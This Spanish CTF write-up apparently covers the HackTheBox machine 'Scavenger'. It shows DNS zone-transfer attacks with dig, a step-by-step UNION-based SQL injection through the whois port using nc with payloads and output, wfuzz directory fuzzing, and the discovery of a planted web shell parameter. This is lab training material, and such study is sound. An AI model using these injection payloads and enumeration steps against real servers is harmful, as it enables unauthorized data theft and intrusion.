## Evaluacion de vulnerabilidades {-}

### Ataque de transferencia de zona {-}

Para hacer ataques de transferencia de zona, utilizamos la herramienta **Dig** (que no hay que confundir con Dick ;)...)

1. Controlar que la resolucion de dominio funciona

    ```bash
    dig @10.10.10.155 supersechosting.htb
    ```

1. Como la resolucion funciona vamos a transmitir peticiones dns

    ```bash
    dig @10.10.10.155 supersechosting.htb ns
    dig @10.10.10.155 supersechosting.htb mx
    ```

1. Ejecutamos el ataque de transferencia de zona

    ```bash
    dig @10.10.10.155 supersechosting.htb axfr
    ```

Aqui vemos que es vulnerable y vemos unos dominios 

    - root.supersechosting.htb
    - ftp.supersechosting.htb
    - whois.supersechosting.htb
    - www.supersechosting.htb
    - mail1.supersechosting.htb
    - ns1.supersechosting.htb

Los añadimos al `/etc/hosts`

```{r, echo = FALSE, fig.cap="hosts despues del domain transfer attack", out.width="90%"}
    knitr::include_graphics("images/scavenger-hosts2.png")
```

Lo miramos con firefox y el host `www.supersechosting.htb` nos muestra algo pero sigue siendo muy poca cosa.

#### Whois {-}

Como el puerto 43 esta abierto. podemos intentar conectar con la maquina para entablar peticiones whois.

```bash
nc 10.10.10.155 43
EEEE
#Output
% SUPERSECHOSTING WHOIS server v0.5beta@MariaDB10.1.37
% This query returned 0 object
```

Como vemos que MariaDB esta por detras intentamos ponerle una comilla

```bash
nc 10.10.10.155 43
'
#Output
% SUPERSECHOSTING WHOIS server v0.5beta@MariaDB10.1.37
1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB...
```

### SQL Injection por Whois {-}

Como el mensaje nos da `the right syntax to use near "''")` ya vemos como podemos montarnos el ataque.

```bash
nc 10.10.10.155 43
') ORDER BY 100#
#Output
Unknown column '100' in 'order clause'
```

Como vemos que no puede ordenarnos la query por la columna 100 quiere decir que no hay 100 columnas. Investigamos 
para encontrar cuantas columnas hay.

```bash
nc 10.10.10.155 43
') ORDER BY 4#
#Output
Unknown column '4' in 'order clause'

nc 10.10.10.155 43
') ORDER BY 3#
#Output
Unknown column '3' in 'order clause'

nc 10.10.10.155 43
') ORDER BY 2#
#Output
% This query returned 0 object
```

Ya vemos aqui que hay dos columnas. Podemos aplicar un **UNION SELECT** para ver las etiquetitas a traves de las cuales
podemos injectar los datos con queries.

```bash
nc 10.10.10.155 43
') union select 1,2#
#Output
% This query returned 1 object
1
```

Vemos aqui que injectaremos por la data 1.

1. Qual es la base de datos

    ```bash
    nc 10.10.10.155 43
    ') union select database(),2#
    #Output
    % This query returned 1 object
    whois
    ```

1. Qual es la version

    ```bash
    nc 10.10.10.155 43
    ') union select version(),2#
    #Output
    % This query returned 1 object
    10.1.37-MariaDB-0
    ```

1. Qual son las tablas de la base de datos whois

    ```bash
    nc 10.10.10.155 43
    ') union select table_name,2 from information_schema.tables where table_schema = "whois"#
    #Output
    % This query returned 1 object
    customers
    ```

1. Qual son las columnas de la tabla customers

    ```bash
    nc 10.10.10.155 43
    ') union select column_name,2 from information_schema.columns where table_schema = "whois" and table_name = "customers"#
    #Output
    % This query returned 3 object
    iddomaindata
    ```

    Aqui podria ser turbio y puede ser mejor de enumerar columnas por columnas

    ```bash
    nc 10.10.10.155 43
    ') union select column_name,2 from information_schema.columns where table_schema = "whois" and table_name = "customers" limit 0,1#
    #Output
    % This query returned 1 object
    id

    nc 10.10.10.155 43
    ') union select column_name,2 from information_schema.columns where table_schema = "whois" and table_name = "customers" limit 1,1#
    #Output
    % This query returned 1 object
    domain

    nc 10.10.10.155 43
    ') union select column_name,2 from information_schema.columns where table_schema = "whois" and table_name = "customers" limit 2,1#
    #Output
    % This query returned 1 object
    data
    ```

1. Enumerar lo que hay a dentro de la columna domain

    ```bash
    nc 10.10.10.155 43
    ') union select domain,2 from customers#
    #Output
    % This query returned 4 object
    supersechosting.htbjustanotherblog.htbpwnhats.htbrentahacker.htb
    ```

    Aqui tambien se podria hacer un limit 0,1 1,1 etc...


Ya podemos añadir estos dominios en el `/etc/hosts`.

```{r, echo = FALSE, fig.cap="hosts despues del sqli", out.width="90%"}
    knitr::include_graphics("images/scavenger-hosts3.png")
```

Aqui ya intentamos conectar a estos nuevos dominios con Firefox pero sigue siendo lo mismo. Intentamos hacer nuevamente ataques 
de zonas con estos nuevos dominios

### Ataque de transferencia de zona Part 2 {-}

```bash
dig @10.10.10.155 justanotherblog.htb axfr
dig @10.10.10.155 pwnhats.htb axfr
dig @10.10.10.155 rentahacker.htb axfr
```

El ultimo dominio nos muestra un dominio turbio `sec03.rentahacker.htb`. Lo añadimos nuevamente en el `/etc/hosts` y por firefox
nos conectamos. Por fin algo nuevo.

Esta pagina nos hace pensar que gente ya a hackeado la pagina por otros *Haxxors*. Si es el caso, fuzzeamos la pagina.

### Web Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://sec03.rentahacker.htb/FUZZ
```

Aqui hay un poco de todo. Intentamos fuzzear por archivos **PHP**

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://sec03.rentahacker.htb/FUZZ.php
```

Ya encontramos un fichero **shell.php**. Visitamos la pagina por firefox y efectivamente parece una shell pero no tenemos el nombre
del comando usado para ejecutar los comandos. Lo buscamos con **WFUZZ** diciendole de ocultar las respuestas que retornan 0 palabras.

```bash
wfuzz -c -t 200 --hc=404 --hw=0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://sec03.rentahacker.htb/shell.php?FUZZ=whoami
```

encontramos el comando `hidden`



